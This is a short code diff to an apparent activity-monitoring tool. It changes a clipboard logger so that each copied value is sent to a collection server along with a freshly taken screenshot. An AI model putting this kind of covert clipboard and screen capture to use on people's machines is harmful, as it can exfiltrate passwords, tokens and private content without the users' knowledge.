@@ -9,6 +9,8 @@ import pyperclip
 from time import sleep
 from modules import consumerServer
 from utils.utils import *
+from modules import screenshot as sc
+
 
 
 def logClipboard():
@@ -25,13 +27,15 @@ def logClipboard():
         if temp_value != recent_value:
             recent_value = temp_value
             print(f"{timestamp()} {USER} Clipboard copy {recent_value}")
+            img = sc.take_screenshot()
             session.post(consumerServer.SERVER_ADDR, json={
                 "timestamp": timestamp(),
                 "user": USER,
                 "category": "Clipboard",
                 "application": "Clipboard",
                 "event_type": "copy",
-                "clipboard_content": recent_value
+                "clipboard_content": recent_value,
+                "screenshot":img
             })
         sleep(0.2)
 
